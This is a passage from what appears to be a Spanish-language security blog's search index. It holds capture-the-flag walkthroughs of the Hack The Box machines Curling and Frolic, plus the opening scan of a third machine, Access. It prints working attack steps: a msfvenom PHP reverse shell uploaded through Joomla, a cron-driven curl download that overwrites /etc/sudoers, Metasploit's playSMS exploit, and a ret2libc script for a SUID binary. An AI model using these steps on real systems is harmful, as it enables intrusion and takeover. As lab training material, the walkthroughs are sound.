visitar la direccion nos encontramos con una cadena en base64.\nAl decodificar dicha cadena nos devuelve Curling2018! posiblemente una contraseña para uno de los dos usuarios administrator y floris. Al intentar con el usuario floris y la contraseña en /secret.txt nos logramos logear al panel de administracion de joomla.\n1 2 Username: floris Password: Curling2018! SHELL Ahora que tenemos acceso al panel de administracion podemos intentar obtener una shell mediante una extension mod_simplefileupload. Primero debemos de generar nuestro payload con msfvenom y poner a la escucha nuestra maquina con multi/handler.\nMetasploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@sckull:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.12.11 LPORT=7878 -o batman.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 1112 bytes Saved as: batman.php root@sckull:~/htb/curling# msfconsole -q msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload php/meterpreter/reverse_tcp payload =\u0026gt; php/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; set LHOST 10.10.12.11 LHOST =\u0026gt; 10.10.12.11 msf5 exploit(multi/handler) \u0026gt; set LPORT 7878 LPORT =\u0026gt; 7878 msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.12.11:7878 Para subir nuestra extension nos dirigmos a Extentions \u0026gt; Manage \u0026gt; Install \u0026gt; Upload Package File, elegimos nuestro paquete.\nLuego nos dirigimos a http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php, procedemos a subir nuestro payload y visitar la pagina donde se encuentra nuestro payload.\nY obtenemos nuestra sesion meterpreter.\nMetasploit - Sesion Meterpreter En la carpeta /home/floris encontramos el flag user.txt pero no tenemos permisos para leerlo, pero encontramos un archivo con el nombre de password_backup.\nUtilizamos xxd para verificar el archivo, al consulatar la firma de archivos encontramos que es un archivo de tipo bzip2.\nFile Sigs Utilizamos nuevamente xxd para escribir este archivo en /tmp.\n1 xxd -r /home/floris/password_backup \u0026gt; /tmp/backup.bz2 Pasamos nuestro archivo a base64 para poder extraerlo localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@sckull:~/htb/curling# cat base64 | base64 -d \u0026gt; backup.bz2 root@sckull:~/htb/curling# bzip2 -d backup.bz2 root@sckull:~/htb/curling# ls backup base64 batman.php mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat backup �l[password�r�BZh91AY\u0026amp;SY6Ǎ����@@!PtD�� t\u0026#34;d�hhOPIS@��6��8ET\u0026gt;P@�#I bՃ|3��x���������(*N�\u0026amp;�H��k1��x��\u0026#34;�{�ೱ��]��B@�6�m��root@sckull:~/htb/curling# file backup backup: gzip compressed data, was \u0026#34;password\u0026#34;, last modified: Tue May 22 19:16:20 2018, from Unix, original size 141 root@sckull:~/htb/curling# mv backup file.gz root@sckull:~/htb/curling# gunzip file.gz root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# file file file: bzip2 compressed data, block size = 900k root@sckull:~/htb/curling# bzip2 -d file.bz2 root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat file password.txt0000644000000000000000000000002313301066143012147 0ustar rootroot5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling# file file file: POSIX tar archive (GNU) root@sckull:~/htb/curling# tar xvf file password.txt root@sckull:~/htb/curling# cat password.txt 5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling# Finalmente despues de pasar por varios archivos nos encontramos con una contraseña dentro del archivo password.txt, vamos a utilizarla para el usuario Floris en el servicio ssh y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Realizamos una enumeracion de posibles exploits con linux-exploit-suggester dentro del directorio /tmp, esto para facilitarnos una escalada de privilegios.\nDirty Sock Encontramos el CVE-2019-7304 de dirty_sock que podria ayudarnos para escalar privilegios, descargamos y ejecutamos nuestro exploit en /tmp, el cual nos creara un usario con privilegios root.\nCambiamos de usuario con su al usuario dirty_sock, y obtenemos privilegios root y la bandera root.txt.\nPRIVILEGE ESCALATION v2 Para esta Curling tenemos otra forma de obtener root, para ello utilizamos pspy para ver los cron que se ejecutan.\nObservamos que hay uno cronjob que ejecuta un comando el cual copia un archivo llamado default.txt a /home/floris/admin-area/input.\n1 cat /root/default.txt \u0026gt; /home/floris/admin-area/input Y otro que hace uso de curl y mediante un archivo hace una consulta el cual lo guarda en report.\n1 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report Sabiendo lo anterior podemos crear un archivo sudoers que contenga permisos de usuario root para el usuario floris, utilizar un servidor local para que el cron haga la consulta, descargue el archivo y lo guarde en el archivo de sudoers.\nsudoers\nPython HTTP Server\nEditamos el archivo input con lo siguiente:\n1 2 url = \u0026#34;http://10.10.12.11/sudoers\u0026#34; output = \u0026#34;/etc/sudoers\u0026#34; ","description":"Curling, encontramos credenciales tras enumerar Joomla y mediante una extension obtuvimos acceso a la maquina. Un pequeño reto nos permitio obtener una contraseña para realizar movimiento lateral. Para escalar privilegios se muestran dos formas, ejecutando el exploit Dirty Sock y modificando el archivo Sudoers mediante Curl y un CronJob.","id":211,"section":"posts","tags":["dirty_sock","metasploit","curl","cron","xxd"],"title":"Hack The Box - Curling","uri":"https://sckull.github.io/posts/curling/"},{"content":"\rFrolic de HackTheboxk. Tras analizar el codigo fuente de la pagina web presenta multiples retos lo que nos llevo a unas credenciales que utilizamos en playSMS el cual explotamos una vulnerabilidad que nos dio acceso a la maquina. Para escalar privilegios expotamos un binario con privilegios SUID.\nNombre Frolic OS Linux Puntos 20 Dificultad Facil IP 10.10.10.111 Maker felamos\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.2, 3.4, 5, 5, 6.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 5, 7, 3, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Realizamos un escaneo de puertos udp y tcp con masscan.\n1 2 3 4 5 6 7 8 masscan -p1-65535,U:1-65535 10.10.10.111 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 139/tcp on 10.10.10.111 Discovered open port 9999/tcp on 10.10.10.111 Escaneando el servicio que corre en los puertos encontrados con masscan.\n1 2 3 4 5 6 7 8 9 10 11 Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.111 Host is up (1.0s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 9999/tcp open http nginx 1.10.3 (Ubuntu) Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds SAMBA Un escaneo de puntos compartidos con smbclient, no encontramos mucho que nos pudiese ayudar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@sckull:~# smbclient -L 10.10.10.111 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FRIENDZONE HTTP Un escaneo de rutas y archivos con gobuster al puerto 9999.\n1 2 3 4 5 6 root@sckull:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.111:9999/ -q -np -x php,html,txt,js -t 15 /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) /playsms (Status: 301) Dentro de la ruta /admin encontramos un panel de administracion que necesita un usuario y contraseña\nEn /backup encontramos password.txt y user.txt que contienen una contraseña y usuario respectivamente:\n1 2 passsword.txt -\u0026gt; password - imnothuman user.txt -\u0026gt; user - admin En la ruta /dev y /loop no encontramos nada, dentro de /test informacion de la version de php corriendo en la maquina.\nFinalmente en /playsms encontramos un login:\nAdmin - Challenges Analizando el codigo de la ruta /admin encontramos que contiene un archivo de javascript llamado login.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Crack me :|\u0026lt;/title\u0026gt; \u0026lt;!-- Include CSS File Here --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;/\u0026gt; \u0026lt;!-- Include JS File Here --\u0026gt; \u0026lt;script src=\u0026#34;js/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;c\u0026#39;mon i m hackable\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;form_id\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;myform\u0026#34;\u0026gt; \u0026lt;label\u0026gt;User Name :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;/\u0026gt; \u0026lt;label\u0026gt;Password :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;Login\u0026#34; id=\u0026#34;submit\u0026#34; onclick=\u0026#34;validate()\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b class=\u0026#34;note\u0026#34;\u0026gt;Note : Nothing\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Y dentro de login.js encontramos una condicional que contiene un usuario y contraseña, tambien una redireccion hacia success.html:\n1 2 usuario: admin contraseña: superduperlooperpassword_lol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(\u0026#34;username\u0026#34;).value; var password = document.getElementById(\u0026#34;password\u0026#34;).value; if ( username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; password == \u0026#34;superduperlooperpassword_lol\u0026#34;){ alert (\u0026#34;Login successfully\u0026#34;); window.location = \u0026#34;success.html\u0026#34;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(\u0026#34;You have left \u0026#34;+attempt+\u0026#34; attempt;\u0026#34;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(\u0026#34;username\u0026#34;).disabled = true; document.getElementById(\u0026#34;password\u0026#34;).disabled = true; document.getElementById(\u0026#34;submit\u0026#34;).disabled = true; return false; } } } Dentro de success.html encontramos caracteres extraños:\n1 ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Utilizando la pagina ook-language para decodificar lo anterior:\nNos muestra el mensaje: \u0026lsquo;Nothing here check /asdiSIAJJ0QWE9JAS\u0026rsquo; por lo que podria ser una ruta dentro de la pagina al visitar dicha ruta nos encontramos con lo siguiente:\n1 2 3 4 5 6 7 UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA En este caso un archivo codificado en base64 y lo agregamos a un nuevo archivo, verificamos que tipo de archivo es con \u0026lsquo;file\u0026rsquo; y vemos que el archivo decodificado (file_decode) es un archivo zip por lo que le cambiamos el nombre y le agregamos \u0026lsquo;.zip\u0026rsquo; al final:\n1 2 3 4 5 root@sckull:~/htb/frolic# echo \u0026#34;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA\u0026#34; | base64 -d \u0026gt; file.txt root@sckull:~/htb/frolic# file file.txt file.txt: Zip archive data, at least v2.0 to extract root@sckull:~/htb/frolic# root@sckull:~/htb/frolic# mv file.txt file.zip Luego al intentar descomprimir el archivo file.zip nos pide una contraseña, en este caso la contraseña es \u0026lsquo;password\u0026rsquo; (contraseñas comunes), nos devuelve un archivo index.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@sckull:~/htb/frolic# 7z x file.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 Scanning the drive for archives: 1 file, 360 bytes (1 KiB) Extracting archive: file.zip -- Path = file.zip Type = zip Physical Size = 360 Enter password (will not be echoed):password Everything is Ok Size: 617 Compressed: 360 root@sckull:~/htb/frolic# ls file.zip index.php En el interior de index.php nos encontramos con texto en HEX al pasarlo a texto nos devuelve otra vez un texto en base64:\n1 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a 1 2 3 4 5 root@sckull:~/htb/frolic# echo 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a | xxd -r -p KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== Al decodificar el texto en base64 nos devuelve texto en lenguaje \u0026lsquo;brainfuck\u0026rsquo;:\n1 2 3 4 5 6 root@sckull:~/htb/frolic# echo KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++++ +.--- --.++ +++++ .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---- --.-- ----- .\u0026lt;+++ +[-\u0026gt;+ +++\u0026lt;] \u0026gt;+++. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ .---. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; ++..\u0026lt; root@sckull:~/htb/frolic# Decodificando el mensaje con brainfuck-language\nplaySMS Intentamos utilizar idkwhatispass como contraseña en /playsms y el usuario admin y nos logramos logear dentro de la plataforma.\nPara esta plataforma (playsms) encontramos un exploit (exploit/multi/http/playsms_uploadcsv_exec) dentro de metasploit y lo utilizamos con las credenciales que habiamos encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 msf5 \u0026gt; use exploit/multi/http/playsms_uploadcsv_exec msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.111 yes The target address range or CIDR identifier RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.X.X yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.X.X:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (38247 bytes) to 10.10.10.111 [*] Meterpreter session 1 opened (10.10.X.X:4444 -\u0026gt; 10.10.10.111:33574) meterpreter \u0026gt; shell Process 1765 created. Channel 0 created. cd /home/ayush ls user.txt cat user.txt 2ab95909cf509f85a6f476b59a0c2fe0 Obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION En los archivos de ayush encontramos un archivo llamado .rop que tiene permisos del usuario root.\n1 2 3 4 5 6 7 www-data@frolic:/home/ayush/.binary$ ls -lah ls -lah total 16K drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 . drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 .. -rwsr-xr-x 1 root root 7.4K Sep 25 00:59 rop www-data@frolic:/home/ayush/.binary$ Utilizando el siguiente script obtenemos privilegios root y nuestra bandera root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from struct import pack from subprocess import call system = 0xb7e19000 + 0x0003ada0 exit = 0xb7e19000 + 0x0002e9d0 binsh = 0xb7e19000 + 0x0015ba0b def p32(num): return pack(\u0026#34;\u0026lt;I\u0026#34;,num) buf = \u0026#34;A\u0026#34;*52 buf += p32(system) buf += p32(exit) buf += p32(binsh) call([\u0026#34;/home/ayush/.binary/rop\u0026#34;, buf]) 1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@frolic:/tmp$ curl 10.10.15.46:80/bf.py -o bf.py www-data@frolic:/tmp$ ls ls bf.py www-data@frolic:/tmp$ python bf.py python bf.py # whoami; id; wc -c /root/root.txt; cat /root/root.txt whoami; id; wc -c /root/root.txt; cat /root/root.txt root uid=0(root) gid=33(www-data) groups=33(www-data) 33 /root/root.txt 85d3fdf03f969892538ba9a731826222 # ","description":"Frolic de HackTheboxk. Tras analizar el codigo fuente de la pagina web presenta multiples retos lo que nos llevo a unas credenciales que utilizamos en playSMS el cual explotamos una vulnerabilidad que nos dio acceso a la maquina. Para escalar privilegios expotamos un binario con privilegios SUID.","id":212,"section":"posts","tags":["smbclient","ook","brainfuck","playSMS","metasploit",""],"title":"Hack The Box - Frolic","uri":"https://sckull.github.io/posts/frolic/"},{"content":"\rAccess con Sistema Operativo Windows y dificultad facil, presenta un servicio FTP el cual contiene una base de datos donde encontramos un correo electronico con credenciales que utilizamos en Telnet. Utilizando las credenciales guardadas ejecutamos un payload de metasploit para obtener acceso privilegiado.\nNombre Access OS Windows Puntos 20 Dificultad Facil IP 10.10.10.98 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.4, 6.5, 5, 5, 3.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 9, 1, 9, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Utilizando la herramienta nmap para escaneo de puertos y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-29 21:08 CST Initiating SYN Stealth Scan at 21:08 Scanning 10.10.10.98 (10.10.10.98) [65535 ports] Discovered open port 23/tcp on 10.10.10.98 Discovered open port 80/tcp on 10.10.10.98 Discovered open port 21/tcp on 10.10.10.98 Completed SYN Stealth Scan at 21:15, 438.01s elapsed (65535 total ports) Initiating Service scan at 21:15 Scanning 3 services on 10.10.10.98 (10.10.10.98) Completed Service scan at 21:18, 160.97s elapsed (3 services on 1 host) Completed NSE at 21:19, 1.78s elapsed Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.37s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: MegaCorp Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose|phone Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%) OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.017 days (since Sat Sep 29 20:54:14 2018) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: Busy server or unknown class Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 342.05 